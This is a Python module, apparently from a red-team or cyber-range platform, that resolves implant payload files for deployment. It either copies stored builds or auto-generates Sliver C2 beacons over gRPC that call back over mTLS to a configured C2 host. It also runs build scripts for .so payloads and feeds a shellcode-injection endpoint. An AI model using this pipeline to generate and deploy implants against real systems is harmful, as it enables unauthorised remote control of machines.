"""IOC payload resolver.

Resolves a payload filename to a local Path, fetching or generating the file
when absent.  Used by ioc_deploy._bg_deploy_and_register() and the
inject-shellcode endpoint so they do not need to pre-stage implant binaries.

Resolution order:
  1. iocs/payloads/<filename> present on disk → return Path directly.
  2. Filename matches BEACON_FILENAME_PATTERN (beacon_linux|windows|freebsd|darwin):
     a. Query ImplantBuilds for matching goos + implant_type='beacon', file on disk.
     b. If found, copy to iocs/payloads/<filename>, return Path.
     c. If not found, auto-generate via _serialized_sliver_compile from c2/sliver_compile.
        c2_url = f"mtls://{config.C2_IP}:{config.MTLS_LISTENER_PORT}"
        goos derived: linux→linux, windows→windows, firewall→freebsd.
        Wait up to 300s; raise PayloadResolutionError on timeout.
        Copy result to iocs/payloads/<filename>, return Path.
  3. Filename ends in .so and scripts/build_<stem>.sh exists:
     Run build script via asyncio.create_subprocess_exec(); re-check iocs/payloads/; return Path.
  4. Raise PayloadResolutionError("<filename> not resolvable").
"""

import asyncio
import logging
import re
import shutil
from pathlib import Path
from typing import Any

from fastapi_backend.core.config import config

logger = logging.getLogger(__name__)

BEACON_FILENAME_PATTERN = re.compile(r"beacon_(linux|windows|freebsd|darwin)")

# OS name → goos for Sliver compile
_BOX_OS_TO_GOOS = {
    "linux": "linux",
    "windows": "windows",
    "firewall": "freebsd",
    "freebsd": "freebsd",
    "darwin": "darwin",
}


class PayloadResolutionError(RuntimeError):
    """Raised when an IOC payload cannot be resolved on disk for the requested OS/arch."""


async def _resolve_ioc_payload(
    payload_filename: str,
    box_os: str,
    db: Any,
) -> Path:
    """Resolve payload_filename to a local Path suitable for NXC file upload.

    Writes resolved bytes to iocs/payloads/<filename> as cache before returning.
    Thread-safe: concurrent calls for the same filename are serialized via a
    per-filename lock so Sliver auto-generate runs only once.
    """
    payloads_dir = Path(config.PROJECT_ROOT) / "iocs" / "payloads"
    payloads_dir.mkdir(parents=True, exist_ok=True)
    dest = payloads_dir / payload_filename

    # Step 1: already on disk
    if dest.exists():
        return dest

    # Step 2: beacon auto-resolve
    m = BEACON_FILENAME_PATTERN.match(payload_filename)
    if m:
        goos = _BOX_OS_TO_GOOS.get(box_os.lower(), "linux")
        resolved = await _resolve_beacon(payload_filename, goos, dest, db)
        if resolved:
            return dest

    # Step 3: .so build script
    if payload_filename.endswith(".so"):
        stem = Path(payload_filename).stem
        build_script = Path(config.PROJECT_ROOT) / "scripts" / f"build_{stem}.sh"
        if build_script.exists():
            proc = await asyncio.create_subprocess_exec(
                "bash", str(build_script),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            if dest.exists():
                return dest
            raise PayloadResolutionError(
                f"{payload_filename}: build script failed — {stderr.decode(errors='replace')}"
            )

    raise PayloadResolutionError(
        f"{payload_filename} not resolvable: file absent, no matching ImplantBuilds row, "
        "and no build script. Pre-generate this payload before deploying."
    )


async def _resolve_beacon(
    payload_filename: str,
    goos: str,
    dest: Path,
    db: Any,
) -> bool:
    """Try to resolve a beacon payload. Returns True if dest was written."""
    from pathlib import Path as _Path  # cycle-break

    from sqlalchemy import select  # cycle-break

    from fastapi_backend.database.models import ImplantBuilds  # cycle-break

    # Step 2a: check ImplantBuilds DB
    try:
        rows = db.execute(
            select(ImplantBuilds).where(
                ImplantBuilds.os == goos,
                ImplantBuilds.implant_type == "beacon",
            ).order_by(ImplantBuilds.created_at.desc())
        ).scalars().all()

        for row in rows:
            if row.filename:
                store_dir = _Path(config.IMPLANT_STORE_DIR) / row.id
                candidate = store_dir / row.filename
                if candidate.exists():
                    shutil.copy2(str(candidate), str(dest))
                    logger.info(
                        "Payload %s resolved from ImplantBuilds row %s",
                        payload_filename, row.id,
                    )
                    return True
    except Exception as exc:
        logger.warning("ImplantBuilds query failed for %s: %s", payload_filename, exc)

    # Step 2c: auto-generate via Sliver gRPC
    if not config.SLIVER_ENABLED or not config.C2_IP:
        return False

    try:
        from fastapi_backend.c2.sliver_compile import (
            _serialized_sliver_compile,  # lazy-load
        )
        from fastapi_backend.routes.c2 import (  # lazy-load
            _build_generate_req_bytes,
            _get_sliver_client,
            _parse_generate_response,
        )

        client = _get_sliver_client()
        if client is None:
            return False

        goarch = "amd64"
        c2_url = f"mtls://{config.C2_IP}:{config.MTLS_LISTENER_PORT}"
        beacon_interval_ns = 60 * 1_000_000_000
        req_bytes = _build_generate_req_bytes(
            goos=goos, goarch=goarch, fmt=2,
            is_beacon=True,
            beacon_interval_ns=beacon_interval_ns,
            beacon_jitter_ns=beacon_interval_ns // 2,
            c2_url=c2_url,
        )
        generate_raw = client._channel.unary_unary(
            "/rpcpb.SliverRPC/Generate",
            request_serializer=lambda x: x,
            response_deserializer=lambda x: x,
        )
        response_bytes, _ = await _serialized_sliver_compile(generate_raw, req_bytes, timeout=300)
        _, binary_data = _parse_generate_response(response_bytes)
        dest.write_bytes(binary_data)
        logger.info("Auto-generated beacon %s via Sliver gRPC", payload_filename)
        return True
    except Exception as exc:
        logger.warning("Sliver auto-generate failed for %s: %s", payload_filename, exc)
        return False
